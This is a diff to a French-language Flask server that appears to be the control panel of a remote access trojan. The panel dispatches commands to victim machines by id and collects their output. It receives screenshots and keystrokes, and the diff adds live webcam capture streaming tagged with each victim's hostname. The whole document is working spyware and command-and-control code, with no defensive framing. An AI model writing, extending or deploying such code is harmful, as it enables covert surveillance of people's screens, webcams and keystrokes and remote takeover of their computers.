@@ -1,3 +1,4 @@
+# app.py (serveur Flask)
 from flask import (
     Flask, request, render_template_string,
     send_file, redirect, url_for, Response
@@ -12,31 +13,32 @@ commande = ""
 resultat_commande = ""
 mode = "cmd"        # "cmd", "live", "webcam" ou "keys"
 last_host = ""      # hostname du dernier screenshot reçu
+last_webcam_host = ""  # hostname du dernier flux webcam reçu
 key_logs = ""       # journal des frappes
 
-# Template
+# Template HTML
 html_page = """
 <!DOCTYPE html>
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Contrôle à Distance v.V </title>
+  <title>Contrôle à Distance v.IV</title>
   <style>
     body { font-family: sans-serif; padding:20px; }
     .section { margin-top:30px; }
-    #stream, #webcam { max-width:90vw; border:1px solid #ccc; display:block; }
+    img.stream { max-width:90vw; border:1px solid #ccc; display:block; }
     pre { background:#f5f5f5; padding:10px; white-space: pre-wrap; }
     button { margin-right:10px; }
   </style>
 </head>
 <body>
-  <h1>🖥️ Contrôle à Distance v.IV</h1>
+  <h1>🖥️ Contrôle à Distance v.V</h1>
 
   <!-- Mode switch -->
   <div class="section">
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=cmd'"   {% if mode=='cmd'   %}disabled{% endif %}>⚪ Commande</button>
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=live'"  {% if mode=='live'  %}disabled{% endif %}>🔴 Live</button>
-    <button onclick="location.href='{{ url_for('set_mode') }}?mode=webcam'"{% if mode=='webcam'%}disabled{% endif %}>📷 Webcam</button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=cmd'"   {% if mode=='cmd' %}disabled{% endif %}>⚪ Commande</button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=live'"  {% if mode=='live' %}disabled{% endif %}>🔴 Live</button>
+    <button onclick="location.href='{{ url_for('set_mode') }}?mode=webcam'"{% if mode=='webcam' %}disabled{% endif %}>📷 Webcam</button>
     <button onclick="location.href='{{ url_for('set_mode') }}?mode=keys'" {% if mode=='keys'  %}disabled{% endif %}>🗝️ Keylogger</button>
   </div>
 
@@ -61,14 +63,15 @@ html_page = """
   <div class="section">
     <h2>Live Screen</h2>
     <p><strong>Hostname :</strong> {{ last_host or "(aucun)" }}</p>
-    <img id="stream" src="/mjpeg" alt="Live screen">
+    <img class="stream" src="/mjpeg" alt="Live screen">
   </div>
   {% endif %}
 
   {% if mode == 'webcam' %}
   <div class="section">
     <h2>Webcam</h2>
-    <img id="webcam" src="/webcam" alt="Webcam stream">
+    <p><strong>Hostname :</strong> {{ last_webcam_host or "(aucun)" }}</p>
+    <img class="stream" src="/webcam_mjpeg" alt="Webcam stream">
   </div>
   {% endif %}
 
@@ -97,6 +100,7 @@ def index():
         resultat_commande=resultat_commande,
         mode=mode,
         last_host=last_host,
+        last_webcam_host=last_webcam_host,
         key_logs=key_logs
     )
 
@@ -116,7 +120,7 @@ def get_mode():
 def get_commande():
     mid = request.args.get("id","")
     if not mid:
-        return "", 400
+        return "",400
     if destinataires == "*":
         return commande
     if destinataires.startswith("!"):
@@ -131,7 +135,7 @@ def post_resultat():
     mid = request.form.get("id","").strip()
     res = request.form.get("resultat","")
     resultat_commande += f"\n[{mid}]\n{res}\n"
-    return "OK", 200
+    return "OK",200
 
 @app.route("/clear_output", methods=["POST"])
 def clear_output():
@@ -145,14 +149,55 @@ def post_screen():
     f = request.files.get("screen")
     mid = request.form.get("id","").strip()
     if not f or not mid:
-        print("[post_screen] Requête invalide")
-        return "Bad Request", 400
+        return "Bad Request",400
     data = f.read()
     with open("latest.png","wb") as imgf:
         imgf.write(data)
     last_host = mid
-    print(f"[post_screen] Screenshot reçu de {mid}, {len(data)} bytes")
-    return "Screenshot reçu", 200
+    return "OK",200
+
+@app.route("/mjpeg")
+def mjpeg():
+    def generate():
+        boundary=b"--frame"
+        while True:
+            try:
+                with open("latest.png","rb") as img:
+                    frame=img.read()
+            except FileNotFoundError:
+                time.sleep(0.1)
+                continue
+            yield boundary + b"\r\nContent-Type: image/png\r\n\r\n" + frame + b"\r\n"
+            time.sleep(0.1)
+    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
+
+@app.route("/post_webcam", methods=["POST"])
+def post_webcam():
+    global last_webcam_host
+    f = request.files.get("webcam")
+    mid = request.form.get("id","").strip()
+    if not f or not mid:
+        return "Bad Request",400
+    data = f.read()
+    with open("latest_webcam.png","wb") as imgf:
+        imgf.write(data)
+    last_webcam_host = mid
+    return "OK",200
+
+@app.route("/webcam_mjpeg")
+def webcam_mjpeg():
+    def generate_webcam():
+        boundary=b"--frame"
+        while True:
+            try:
+                with open("latest_webcam.png","rb") as img:
+                    frame=img.read()
+            except FileNotFoundError:
+                time.sleep(0.1)
+                continue
+            yield boundary + b"\r\nContent-Type: image/png\r\n\r\n" + frame + b"\r\n"
+            time.sleep(0.1)
+    return Response(generate_webcam(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
 @app.route("/post_keys", methods=["POST"])
 def post_keys():
@@ -161,49 +206,13 @@ def post_keys():
     keys = request.form.get("keys","")
     if mid and keys:
         key_logs += f"\n[{mid}]\n{keys}\n"
-    return "OK", 200
+    return "OK",200
 
 @app.route("/clear_keys", methods=["POST"])
 def clear_keys():
     global key_logs
     key_logs = ""
     return redirect(url_for("index"))
-
-@app.route("/screen.png")
-def screen_png():
-    try:
-        return send_file("latest.png", mimetype="image/png")
-    except FileNotFoundError:
-        return "", 404
-
-def mjpeg_generator():
-    boundary = b"--frame"
-    while True:
-        try:
-            with open("latest.png","rb") as img:
-                frame = img.read()
-        except FileNotFoundError:
-            time.sleep(0.1)
-            continue
-        yield boundary + b"\r\n" + \
-              b"Content-Type: image/png\r\n\r\n" + \
-              frame + b"\r\n"
-        time.sleep(0.1)
-
-@app.route("/mjpeg")
-def mjpeg():
-    return Response(
-        mjpeg_generator(),
-        mimetype="multipart/x-mixed-replace; boundary=frame"
-    )
-
-@app.route("/webcam")
-def webcam():
-    # Placeholder : renvoie le même MJPEG pour tests
-    return Response(
-        mjpeg_generator(),
-        mimetype="multipart/x-mixed-replace; boundary=frame"
-    )
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000, threaded=True)
